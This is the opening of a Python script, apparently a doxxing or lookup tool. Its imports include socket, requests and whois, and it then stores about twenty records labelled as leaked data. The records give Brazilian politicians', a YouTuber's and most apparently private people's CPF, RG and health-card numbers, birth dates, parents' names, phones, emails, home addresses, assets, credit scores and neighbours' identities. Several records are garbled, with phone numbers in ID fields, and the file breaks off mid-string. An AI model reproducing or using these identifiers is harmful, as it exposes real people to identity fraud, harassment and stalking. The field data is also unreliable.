import socket
import requests
import random
import time
import os
from faker import Faker
from colorama import Fore
import whois
import platform

sistema = platform.system()

dado1 = """
         (Dado Vazado, pode estar desatualizado)

            NOME: LUIZ INACIO LULA DA SILVA
            CPF: 070.680.938-68
            Nascimento: 06/10/1945
            Sexo:Masculino
            Estado Civil:Casado(A)
            Município de nascimento: Garanhuns /PE
            Nacionalidade:Brasileira
            Nome da Mãe: EURIDICE FERREIRA DE MELO
            0001-10-27
            Telefone: 71632905191
            
            
 """

dado2 = """
          (Dado vazado, pode estar desatualizado)

            Nome completo:Dilma Vana Rousseff
            CPF:133.267.246-91 
            RG:901.715.822-2
            PIS:10086198413
            Signo: Sagitário
            Telefone: (61)3467-0413 / (61)7161-5220 
            Data de nascimento:14/12/1947
            Idade ao final de 2024: 77
            Filha: Paula Rousseff de Araújo
            Município de nascimento: Belo Horizonte /MG
            Nacionalidade: Brasileira Nata
            Sexo: Feminino
            Estado Civil: Divorciado(A)
            Grau de Instrução: Superior Completo
            Pai:Pedro Rousseff (Bulgaro)
            Mãe:Jane da Silva
            Ocupação principal declarada: Economista
            CNPJ: 34274233000102
            Empresa: PETROBRAS DISTRIBUIDORA S A,PETROBRAS DISTRIBUIDORA S/A,PETROBRAS DISTRIBUIDORA S.A - ES - 2792944404
            Telefones: (61) 3411.1200 (61) 3411.1201
            Fax: (61) 3411.2222
            
            """

dado3 = """

          (Dados vazados, pode estar desatualizado)
          DADOS DO BLUEZAO (POSEIDON DO ESGOTO)

                
                • TÍTULO ELEITORAL: 
                
                • RG: SEM INFORMAÇÃO 
                • ORGÃO EXPEDIDOR: SEM INFORMAÇÃO
                • RG-UF: SEM INFORMAÇÃO 
                • CSN: 705801482057032
                
                • NOME: ALEXANDRE FLAUSINO DA MOTTA
                • NASCIMENTO: 01/07/1975
                • SEXO: Masculino
                • OBITO: Não

                • MÃE: ELZA FLAUSINA DA MOTTA
                • CPF DA MÃE: 51093103787

                • NACIONALIDADE: BRASILEIRO
                • ESCOLARIDADE: SEM INFORMAÇÃO

                • ESTADO CIVIL: NAMORANDO
                • CONJUGE: SEM INFORMAÇÃO

                • PROFISSÃO: YOUTUBE
                • RENDA PRESUMIDA: Ate R$ 1.576,00

                • STATUS RECEITA FEDERAL: Suspensa
                • DATA DE ATUALIZAÇÃO NA RECEITA: 08/10/2018
                
                • ENDEREÇOS: 

                Hotel | Hostel Flazao, Casa com desenho do cristo redentor - Ladeira do Durão, 7 - Santa Teresa


                • TELEFONES: 

                +55 21 99386-1518

                • E-MAILS: 

                bluebluezaofodao@yahoo.com.br
                
                • PARENTES: 
                SEM INFORMAÇÃO
                
                • VIZINHOS: 

                CPF: 12603456881 - NOME: PAULO ABREU DA SILVA

                CPF: 01225088747 - NOME: JANDIRA MACHADO DE OLIVEIRA

                CPF: 11437548750 - NOME: KELLY ALVES DOS SANTOS

                CPF: 31639186700 - NOME: NERCINO DE SOUZA GOMES

                CPF: 09481529746 - NOME: LEANDRO DE PAULA SOUSA BENTO

                CPF: 01465617752 - NOME: MARIA DA PENHA NASCIMENTO BOTELHO
                
                """

dado4 = """
          (Dados vazados, pode estar desatualizado)
          
            Nome:JAIR MESSIAS BOLSONARO
            Nome Social/Apelido: AQUELE QUE NÃO SE DEVE PRONUNCIAR
            Número do CNS: 708506301368474    
            CPF: 453.178.287-91            
            Nome da Mãe: OLINDA BONTURI BOLSONARO
            Data de Nascimento: 21/03/1955
            Sexo: MASCULINO    
            Nacionalidade: Brasileiro  
            País de Nascimento: BRASIL

            TÍTULO ELEITOR

            Inscrição: 015564190337
            Eleitor: JAIR MESSIAS BOLSONARO

            DOMICÍLIO ELEITORAL

            Eleições Gerais 2018 - 1º Turno (07/10/2018)
            Zona: 023 Seção: 0581
            Local: ESCOLA MUNICIPAL ROSA DA FONSECA
            Endereço: PRACA MARECHAL HERMES S/N - VILA MILITAR
            Município: RIO DE JANEIRO - RJ
            
            Telefones:
            Tipo    DDD     Telefone
            CELULAR     61  7811-2206
            
            CEP: 70.670-203    
            País Residencia: BRASIL
            Município de Residência: BRASILIA - DF    
            Tipo Logradouro: INVALIDO
            Nome Logradouro: QD SQSW    
            Numero: 102
            Bairro: SUDOESTE
            
            Tipo de bem     Descrição do bem  Valor (R$)

            Apartamento     NR 604 DA SQSW 102 - BLOCO C    240.930,00

            Casa    MAMBUCABA - ANGRA DOS REIS - RJ     98.500,00

            Veículo automotor terrestre: caminhão, automóvel, moto, etc.     MICROONIBUS ANO 2004 - ADQUIRIDO EM 2004    89.000,00
            
            Outros bens imóveis    IMOVEL RUA DIVISORIA - BENTO RIBEIRO - RJ   540.000,00 (VALOR NÃO ATUALIZADO)
            
            Caderneta de poupança  POUPANÇA OURO BANCO DO BRASIL  882.582,35 (VALOR NÃO ATUALIZADO)
            
            Caderneta de poupança  POUPEX BANCO DO BRASIL  21.271,46 (VALOR NÃO ATUALIZADO)
            
            Casa    AV LUCIO COSTA - BARRA DA TIJUCA - RJ   600.000,00 (VALOR NÃO ATUALIZADO)
            
            Veículo automotor terrestre: caminhão, automóvel, moto, etc.     AUTOMOVEL HONDA FIT     71.719,99 (VALOR NÃO ATUALIZADO)
            
            Veículo automotor terrestre: caminhão, automóvel, moto, etc.     VEICULO AQUATICO YAMAHA ANO 2010    46.000,00 (VALOR NÃO ATUALIZADO)
            
            Ações (inclusive as provenientes de linha telefônica)    60 AÇOES ON DA OI  725,40 (VALOR NÃO ATUALIZADO)
            
            Ações (inclusive as provenientes de linha telefônica)    67 AÇOES PN DA OI  557,44 (VALOR NÃO ATUALIZADO)
            
            Caderneta de poupança  CO ESATILO BANCOI DO BRASIL     43.857,90 (VALOR NÃO ATUALIZADO)
            
            Casa    CASA 36, AV LUCIO COSTA - BARRA DA TIJUCA - RJ  500.000,00 (VALOR NÃO ATUALIZADO)
            
            Outras aplicações e Investimentos     BB REF DI PLUS EST  2.823,50 (VALOR NÃO ATUALIZADO)
            
            Depósito bancário em conta corrente no País  BANCO DO BRASIL     46.724,39 (VALOR NÃO ATUALIZADO)
            
            Valor total dos bens declarados: R$ XX.XXX.XXX,XX (VALOR NÃO ATUALIZADO)
            
            """

dado5 = """
            (Dado Vazado, Pode estar desatualizado)

            Nome: FELIPE NETO RODRIGUES VIEIRA
            CPF: 11976388732
            Sexo: Masculino
            Data de Nascimento: 21/01/1988
            Idade: 29
            Nome da Mãe: ROSA ESMERALDA NETO VIEIRA

            Título de Eleitor: 133806990353
            DOMICÍLIO ELEITORAL
            Zona:8
            Seção:394
            Local:ESCOLA MUNICIPAL MEDEIROS E ALBUQUERQUE
            Endereço:RUA BOLÍVIA 62 - ENGENHO NOVO

            Classe Social: A
            Credit Target: M3
            SCORE : 402
            CBO: ADMINISTRADOR
            Renda Presumida: R$ 1326.00

            Estado Civil : SOLTEIRO
            Grau de Instrução: POS GRADUAÇÃO COMPLETA

            Situação do CPF : REGULAR
            Data de Atualização: 06/10/2017
            Região de Origem do CPF: Rio de Janeiro

            Score : 402
            CLASSE DE SCORE: 14


            Participações societárias:
            12600692000198 - PARAFERNALHA PRODUCOES ARTISTICAS LTDA. -ME


            9 Endereços

            Registro: 1 (CASA ATUAL)
            Endereço: Avenida Rui Barbosa, 664
            Complemento: AP 102
            Bairro: Flamengo
            CEP: 22250020
            Cidade: Rio De Janeiro/Rj
            Data: 01/01/2016

            Registro: 2
            Endereço: Rua Lucidio Lago, 411
            Bairro: Méier
            CEP: 20780020
            Cidade: Rio De Janeiro/Rj
            Data: 30/04/2015

            Registro: 3
            Endereço: Largo Do Machado, 29
            Complemento: COB D
            Bairro: Catete
            CEP: 22221020
            Cidade: Rio De Janeiro/Rj
            Data: 01/12/2014

            Registro: 4
            Endereço: Ladeira Do Russel, 57
            Bairro: Glória
            CEP: 22210015
            Cidade: Rio De Janeiro/Rj
            Data: 07/07/2014

            Registro: 5
            Endereço: Largo Do Machado, 21
            Complemento: SL 408
            Bairro: Catete
            CEP: 22221020
            Cidade: Rio De Janeiro/Rj
            Data: 06/06/2013

            Registro: 6
            Endereço: Rua Professor Lafaiete Cortes, 181
            Complemento: AP 101
            Bairro: Tijuca
            CEP: 20550070
            Cidade: Rio De Janeiro/Rj
            Data: 01/08/2012

            Registro: 7
            Endereço: Rua Esteves Júnior, 24
            Complemento: AP 303
            Bairro: Laranjeiras
            CEP: 22231160
            Cidade: Rio De Janeiro/Rj
            Data: 01/08/2012

            Registro: 8
            Endereço: Rua Evaristo Da Veiga, 51
            Complemento: ZZLJ 51
            Bairro: Centro
            CEP: 20031040
            Cidade: Rio De Janeiro/Rj
            Data: 07/11/2011

            Registro: 9
            Endereço: Rua Visconde De Itabaiana, 80
            Complemento: AP 402
            Bairro: Engenho Novo
            CEP: 20780180
            Cidade: Rio De Janeiro/Rj
            Data: 01/10/2008


            Vizinhos ( 5 )

            00000090061764 - JOSELINA CAETANO MARCELINO
            AVENIDA RUI BARBOSA, 0000666, AP 601, CEP: 22250-000, FLAMENGO, RIO DE JANEIRO, RJ

            00000093594356 - RODRIGO PESSOA DE ANDRADE CARVALHO
            AVENIDA RUI BARBOSA, 0000666, AP 302, CEP: 22250-020, FLAMENGO, RIO DE JANEIRO, RJ

            00000139025715 - JOSE LUIZ SILVEIRA MIRANDA
            AVENIDA RUI BARBOSA, 0000666, AP 1201, CEP: 22250-020, FLAMENGO, RIO DE JANEIRO, RJ

            00000234290544 - ERNANI QUEIROZ
            AVENIDA RUI BARBOSA, 0000666, AP 401, CEP: 22250-020, FLAMENGO, RIO DE JANEIRO, RJ

            00000252573749 - MARIO COSTA GALVAO
            AVENIDA RUI BARBOSA, 0000666, AP 1601, CEP: 22250-020, FLAMENGO, RIO DE JANEIRO, RJ


            Telefones ( 10 )
            2121353018 | Embratel - Fixo |#1
            2137950328 | Embratel - Fixo |#1
            2125819479 | Embratel - Fixo |
            2121130045 | Embratel - Fixo |
            2121130046 | Embratel - Fixo |
            2125677881 | Embratel - Fixo |
            2194777520 | Claro - Celular |
            2187292580 | OI - Celular |
            2188940852 | OI - Celular |
            2125336655 | OI - Fixo |


            Emails ( 2 )
            felipeneto@gmail.com

            nessa.oliveira@gmail.com



            Ultimos Cadastros/Consultas:
            08/10/2017: SKIN DERMATOLOGIA E CIRURGIA LTDA

            29/09/2017: DECMINAS DISTR LOGISTICA S/A

            24/08/2017: MITRA DIOCESANA DE CAMPO LIMPO

            22/07/2017: VIVO S/A

            25/03/2017: SKY BRASIL SERVICOS LTDA.

            06/03/2017: NUTOP PRODUTOS FUNCIONAIS LTDA

            22/02/2017: NUTOP PRODUTOS FUNCIONAIS LTDA

            15/02/2017: NUTOP PRODUTOS FUNCIONAIS LTDA

            13/02/2017: NUTOP PRODUTOS FUNCIONAIS LTDA

            05/02/2017: NUTOP PRODUTOS FUNCIONAIS LTDA

            10/11/2016: SONDA SUPERMERCADOS EXPORTACAO E IMPORTA

            12/10/2016: HEITOR VITOR FRALINO SICA
            
            """

dado6 = """
          ° CPF: 07324802486
          ° CNS: 706005871987641
          ° NOME: MARIA LINDINALVA DE OLIVEIRA SOBRINHO
          ° NOME SOCIAL: ---
          ° SEXO: FEMININO
          ° DATA DE NASCIMENTO: 12/08/1977 (47 anos)
          ° TIPO SANGUÍNEO: ---
          ° COR: AMARELA
          ° MUNICÍPIO DE NASCIMENTO: CAJUEIRO - AL

          ° ÓBITO: PESSOA ESTA VIVA
          ° MOTIVO: SEM INFORMAÇÃO
          ° DATA DO ÓBITO: SEM INFORMAÇÃO

          ° MÃE: MARIA LUIZA DA SILVA
          ° PAI: CICERO MANOEL DE OLIVEIRA

          ° DOCUMENTOS

          ° NÚMERO DO RG: RESIDENCIAL
          ° ÓRGÃO EMISSOR: (18)
          ° ESTADO EMISSOR: 99113-4021
          ° DATA DA EMISSÃO RG: Num. RG

          ° CERTIDÃO DE NASCIMENTO ANTIGA

          ° CARTÓRIO: OrgÃ£o Emissor
          ° LIVRO: Estado Emissor
          ° FOLHA: Data de EmissÃ£o
          ° TERMO: 1520234
          ° EMISSÃO CERTIDÃO: SSP
 
          °  TELEFONES
 
          Nenhum telefone encontrado.
 
          ° ENDEREÇOS
 
          ° TIPO DE LOGRADOURO: RUA
          ° LOGRADOURO: GERALDO AGUIAR
          ° COMPLEMENTO: ---
          ° BAIRRO: ACAPULCO
          ° NÚMERO: 246
          ° CIDADE: VALPARAISO - SP
          ° CEP:  16880-000
          
          """

dado7 = """
            ° CPF: 07542212451
            ° CNS: 706800290280822
            ° NOME: EDUARDO OLIVEIRA SILVA
            ° NOME SOCIAL: ---
            ° SEXO: MASCULINO
            ° DATA DE NASCIMENTO: 01/05/1987 (38 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: PRETA
            ° MUNICÍPIO DE NASCIMENTO: OLINDA - PE

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: MARIA JOSE DE OLIVEIRA SILVA
            ° PAI: JOSE LUIZ DA SILVA

            ° DOCUMENTOS

            ° NÚMERO DO RG: CELULAR
            ° ÓRGÃO EMISSOR: (81)
            ° ESTADO EMISSOR: 99528-0593
            ° DATA DA EMISSÃO RG: CELULAR

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: (47)
            ° LIVRO: 98849-5058
            ° FOLHA: Num. RG
            ° TERMO: OrgÃ£o Emissor
            ° EMISSÃO CERTIDÃO: Estado Emissor

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: RUA
            ° LOGRADOURO: DOIS DE SETEMBRO 1572/2726
            ° COMPLEMENTO: AP 05
            ° BAIRRO: ITOUPAVA NORTE
            ° NÚMERO: 2628
            ° CIDADE: BLUMENAU - SC
            ° CEP:  89052-004
            
            """


dado8 = """
            ° CPF: 09262302398
            ° CNS: 702800607427764
            ° NOME: FRANCISCO MARCOS DE SANTIAGO JUNIOR
            ° NOME SOCIAL: ---
            ° SEXO: MASCULINO
            ° DATA DE NASCIMENTO: 11/10/2002 (22 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: AMARELA
            ° MUNICÍPIO DE NASCIMENTO: RUSSAS - CE

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: ANGELA PAULA GONCALVES DE LIMA
            ° PAI: FRANCISCO MARCOS DE SANTIAGO

            ° DOCUMENTOS

            ° NÚMERO DO RG: RESIDENCIAL
            ° ÓRGÃO EMISSOR: (61)
            ° ESTADO EMISSOR: 3315-2425
            ° DATA DA EMISSÃO RG: Desconhecido

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: Desconhecido
            ° LIVRO: Desconhecido
            ° FOLHA: Desconhecido
            ° TERMO: Desconhecido
            ° EMISSÃO CERTIDÃO: Desconhecido

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: DISTRITO
            ° LOGRADOURO: RETIRO
            ° COMPLEMENTO: ---
            ° BAIRRO: DISTRITO RETIRO
            ° NÚMERO: 24
            ° CIDADE: RUSSAS - CE
            ° CEP:  62900-000
            """

dado9 = """
            ° CPF: 07318755323
            ° CNS: 703606053164139
            ° NOME: SABRINA DO NASCIMENTO DE CASTRO
            ° NOME SOCIAL: ---
            ° SEXO: FEMININO
            ° DATA DE NASCIMENTO: 23/08/1995 (29 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: PARDA
            ° MUNICÍPIO DE NASCIMENTO: FORTALEZA - CE

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: MARIA NILCIMAR DO NASCIMENTO
            ° PAI: RAIMUNDO NONATO FERREIRA DE CASTRO

            ° DOCUMENTOS

            ° NÚMERO DO RG: PUBLICO
            ° ÓRGÃO EMISSOR: (61)
            ° ESTADO EMISSOR: 3315-2425
            ° DATA DA EMISSÃO RG: CELULAR

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: (85)
            ° LIVRO: 8553-2894
            ° FOLHA: Num. RG
            ° TERMO: OrgÃ£o Emissor
            ° EMISSÃO CERTIDÃO: Estado Emissor

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: AREA
            ° LOGRADOURO: SITIOS NOVOS
            ° COMPLEMENTO: ---
            ° BAIRRO: SITIOS NOVOS
            ° NÚMERO: S/N
            ° CIDADE: CAUCAIA - CE
            ° CEP:  61600-000
            
            """

dado10 = """

            ° CPF: 00757679102
            ° CNS: 700208912525428
            ° NOME: LOYANNE RODRIGUES ROSA
            ° NOME SOCIAL: ---
            ° SEXO: FEMININO
            ° DATA DE NASCIMENTO: 11/12/1988 (36 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: AMARELA
            ° MUNICÍPIO DE NASCIMENTO: BRASILIA - DF

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: ROSELI RODRIGUES ROSA
            ° PAI: JARBAS DE JESUS ROSA

            ° DOCUMENTOS

            ° NÚMERO DO RG: CELULAR
            ° ÓRGÃO EMISSOR: (61)
            ° ESTADO EMISSOR: 98601-1852
            ° DATA DA EMISSÃO RG: Num. RG

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: OrgÃ£o Emissor
            ° LIVRO: Estado Emissor
            ° FOLHA: Data de EmissÃ£o
            ° TERMO: 511917
            ° EMISSÃO CERTIDÃO: SSP

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: RESIDENCIAL
            ° LOGRADOURO: QE 28 CONJUNTO K FUNDOS CASA 22
            ° COMPLEMENTO: ---
            ° BAIRRO: GUARA II
            ° NÚMERO: 22
            ° CIDADE: BRASILIA - DF
            ° CEP:  71060-112
           
            """
dado11 = """
            ° CPF: 00088233324
            ° CNS: 704606123478720
            ° NOME: FRANCISCA GONCALVES RODRIGUES
            ° NOME SOCIAL: ---
            ° SEXO: FEMININO
            ° DATA DE NASCIMENTO: 15/08/1943 (81 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: PRETA
            ° MUNICÍPIO DE NASCIMENTO: PIRIPIRI - PI

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: MARIANA RODRIGUES DE SOUSA
            ° PAI: JOAO GONÃALVES BENTO

            ° DOCUMENTOS

            ° NÚMERO DO RG: 654375
            ° ÓRGÃO EMISSOR: SSP
            ° ESTADO EMISSOR: PI
            ° DATA DA EMISSÃO RG: 15/08/1983

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: Desconhecido
            ° LIVRO: Desconhecido
            ° FOLHA: Desconhecido
            ° TERMO: Desconhecido
            ° EMISSÃO CERTIDÃO: Desconhecido

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: RUA
            ° LOGRADOURO: CAMPO MAIOR
            ° COMPLEMENTO: ---
            ° BAIRRO: SAO JOSE
            ° NÚMERO: 488
            ° CIDADE: CAPITAO DE CAMPOS - PI
            ° CEP:  64270-000
            
            """
dado12 = """
            ° CPF: 03043114809
            ° CNS: 700502719709956
            ° NOME: MARIA NILZE DOS SANTOS DA COSTA
            ° NOME SOCIAL: ---
            ° SEXO: FEMININO
            ° DATA DE NASCIMENTO: 22/07/1961 (63 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: SEM INFORMACAO
            ° MUNICÍPIO DE NASCIMENTO: --- - ---

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: APARECIDA CASSEMIRO DOS SANTOS
            ° PAI: SEM INFORMAÃÂ¿ÃÂ¿O

            ° DOCUMENTOS

            ° NÚMERO DO RG: PUBLICO
            ° ÓRGÃO EMISSOR: (61)
            ° ESTADO EMISSOR: 3315-2425
            ° DATA DA EMISSÃO RG: Desconhecido

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: Desconhecido
            ° LIVRO: Desconhecido
            ° FOLHA: Desconhecido
            ° TERMO: Desconhecido
            ° EMISSÃO CERTIDÃO: Desconhecido

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: INVALIDO
            ° LOGRADOURO: PINDORAMA
            ° COMPLEMENTO: ---
            ° BAIRRO: PQ JOAO RAMALHO
            ° NÚMERO: 827
            ° CIDADE: SANTO ANDRE - SP
            ° CEP:  09290-130
            
            """
dado13 = """

            ° CPF: 03066019900
            ° CNS: 702500315985832
            ° NOME: CARLOS ALEXANDRE PIZZATO
            ° NOME SOCIAL: ---
            ° SEXO: MASCULINO
            ° DATA DE NASCIMENTO: 05/10/1981 (43 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: SEM INFORMACAO
            ° MUNICÍPIO DE NASCIMENTO: CURITIBA - PR

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: ALVACY TEREZINHA LIMA PIZZATO
            ° PAI: SEM INFORMAÃÃO

            ° DOCUMENTOS

            ° NÚMERO DO RG: RESIDENCIAL
            ° ÓRGÃO EMISSOR: (41)
            ° ESTADO EMISSOR: 3076-9316
            ° DATA DA EMISSÃO RG: Num. RG

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: OrgÃ£o Emissor
            ° LIVRO: Estado Emissor
            ° FOLHA: Data de EmissÃ£o
            ° TERMO: 00083475234
            ° EMISSÃO CERTIDÃO: SSP

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: RUA
            ° LOGRADOURO: ALFREDO SAMPAIO
            ° COMPLEMENTO: FUNDOS
            ° BAIRRO: CAPAO DA IMBUIA
            ° NÚMERO: 31
            ° CIDADE: CURITIBA - PR
            ° CEP:  82810-260
            
            """

dado14 = """
            ° CPF: 07541570400
            ° CNS: 898005982603963
            ° NOME: SEVERINO BARBOSA DE SOUZA
            ° NOME SOCIAL: ---
            ° SEXO: MASCULINO
            ° DATA DE NASCIMENTO: 08/12/1954 (70 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: SEM INFORMACAO
            ° MUNICÍPIO DE NASCIMENTO: --- - ---

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: SEM INFORMAÃÃO
            ° PAI: SEM INFORMAÃÃO

            ° DOCUMENTOS

            ° NÚMERO DO RG: RESIDENCIAL
            ° ÓRGÃO EMISSOR: (61)
            ° ESTADO EMISSOR: 3315-2425
            ° DATA DA EMISSÃO RG: Desconhecido

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: Desconhecido
            ° LIVRO: Desconhecido
            ° FOLHA: Desconhecido
            ° TERMO: Desconhecido
            ° EMISSÃO CERTIDÃO: Desconhecido

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: INVALIDO
            ° LOGRADOURO: EST DA LAGOA
            ° COMPLEMENTO: ---
            ° BAIRRO: TERRA PRETA
            ° NÚMERO: 337
            ° CIDADE: MAIRIPORA - SP
            ° CEP: ---
            
            """
dado15 = """

            ° CPF: 04738433903
            ° CNS: 702802110329762
            ° NOME: FATIMA MARIA DA SILVA LISBOA
            ° NOME SOCIAL: ---
            ° SEXO: FEMININO
            ° DATA DE NASCIMENTO: 20/06/1964 (60 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: AMARELA
            ° MUNICÍPIO DE NASCIMENTO: CURIUVA - PR

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: CINIRA GUARDIANO
            ° PAI: SEM INFORMAÃÃO

            ° DOCUMENTOS

            ° NÚMERO DO RG: RESIDENCIAL
            ° ÓRGÃO EMISSOR: (41)
            ° ESTADO EMISSOR: 98470-3038
            ° DATA DA EMISSÃO RG: Num. RG

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: OrgÃ£o Emissor
            ° LIVRO: Estado Emissor
            ° FOLHA: Data de EmissÃ£o
            ° TERMO: 41294108
            ° EMISSÃO CERTIDÃO: SSP

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: RUA
            ° LOGRADOURO: JOANITA LUIZA ZANINELLI PEREIRA
            ° COMPLEMENTO: CASA
            ° BAIRRO: UBERABA
            ° NÚMERO: 231
            ° CIDADE: CURITIBA - PR
            ° CEP:  81590-336
            
            """

dado16 = """
            ° CPF: 05678961535
            ° CNS: 708501336293379
            ° NOME: VALDINEIA SANTOS
            ° NOME SOCIAL: ---
            ° SEXO: FEMININO
            ° DATA DE NASCIMENTO: 23/07/1980 (44 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: PRETA
            ° MUNICÍPIO DE NASCIMENTO: IPIAU - BA

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: ANELITA SANTOS
            ° PAI: SEM INFORMAÃÃO

            ° DOCUMENTOS

            ° NÚMERO DO RG: CELULAR
            ° ÓRGÃO EMISSOR: (73)
            ° ESTADO EMISSOR: 99922-6236
            ° DATA DA EMISSÃO RG: Num. RG

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: OrgÃ£o Emissor
            ° LIVRO: Estado Emissor
            ° FOLHA: Data de EmissÃ£o
            ° TERMO: 0860777243
            ° EMISSÃO CERTIDÃO: SSP

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: FAZENDA
            ° LOGRADOURO: SÃO RAFAEL
            ° COMPLEMENTO: CASA
            ° BAIRRO: REGIÃO DA SERRINHA
            ° NÚMERO: 026
            ° CIDADE: NOVA IBIA - BA
            ° CEP:  45452-000
            
            """

dado17 = """                ° CPF: 04348900817
            ° CNS: 708704194515890
            ° NOME: HELIO JAIME JOSE DE OLIVEIRA
            ° NOME SOCIAL: ---
            ° SEXO: MASCULINO
            ° DATA DE NASCIMENTO: 14/07/1958 (66 anos)
            ° TIPO SANGUÍNEO: ---
            ° COR: SEM INFORMACAO
            ° MUNICÍPIO DE NASCIMENTO: --- - ---

            ° ÓBITO: PESSOA ESTA VIVA
            ° MOTIVO: SEM INFORMAÇÃO
            ° DATA DO ÓBITO: SEM INFORMAÇÃO

            ° MÃE: HONORINA DE CERQUEIRA OLIVEIRA
            ° PAI: SEM INFORMAÃÃO

            ° DOCUMENTOS

            ° NÚMERO DO RG: RESIDENCIAL
            ° ÓRGÃO EMISSOR: (11)
            ° ESTADO EMISSOR: 3462-3935
            ° DATA DA EMISSÃO RG: Desconhecido

            ° CERTIDÃO DE NASCIMENTO ANTIGA

            ° CARTÓRIO: Desconhecido
            ° LIVRO: Desconhecido
            ° FOLHA: Desconhecido
            ° TERMO: Desconhecido
            ° EMISSÃO CERTIDÃO: Desconhecido

            °  TELEFONES

            Nenhum telefone encontrado.

            ° ENDEREÇOS

            ° TIPO DE LOGRADOURO: INVALIDO
            ° LOGRADOURO: RUA CONSTANTINO DE ABREU
            ° COMPLEMENTO: ---
            ° BAIRRO: JARDIM MIRIAM
            ° NÚMERO: 3
            ° CIDADE: SAO PAULO - SP
            ° CEP:  04417-120
            
            """

dado18 = """
            • NOME: NEUZA DE SIQUEIRA NOQUEIRA
            • CPF: 11337176249
            • MÃE: Não encontrado
            • SEXO: F
            • TELEFONE: 69999148240

            • ENDEREÇO

            • CIDADE: JIPARANA
            • LOGRADOURO: R CLARA 
            • COMPLEMENTO: 
            • NÚMERO: 0002680
            • BAIRRO: SAO PEDRO
            • UF: RO
            • CEP: 76913565
            
            """

dado19 = """

            • NOME: NEUZA DE SIQUEIRA NOGUEIRA
            • CPF: 11337176249
            • MÃE: Não encontrado
            • SEXO: F
            • TELEFONE: 69999148240

            • ENDEREÇO

            • CIDADE: JI PARANA
            • LOGRADOURO: R CLARA 
            • COMPLEMENTO: 
            • NÚMERO: 2680
            • BAIRRO: S PEDRO
            • UF: RO
            • CEP: 76913565
            
            """

dado20 = """
            • NOME: FRANCISCO ALBANO JACOBINO
            • CPF: 33892016453
            • MÃE: Não encontrado
            • SEXO: M
            • TELEFONE: 69999148240

            • ENDEREÇO

            • CIDADE: VILHENA
            • LOGRADOURO: R H UM 
            • COMPLEMENTO: 
            • NÚMERO: 2790
            • BAIRRO: ARIPUANA
            • UF: RO
            • CEP: 76985495

            """

dado21 = """

            • NOME: DANILO COUTINHO OLIVEIRA
            • CPF/CNPJ: 03357823535
            • MÃE: ZILMAR COUTINHO OLIVEIRA
            • NASCIMENTO: 27/11/1989
            • SEXO: M - MASCULINO

            • 🏡 ENDEREÇO 

            • LOGRADOURO: JOSE GRACA FERRAZ 
            • NÚMERO: 0
            • BAIRRO: LAGOINHA
            • CIDADE: CANDIDO SALES
            • UF: BA
"""

dado22 = """

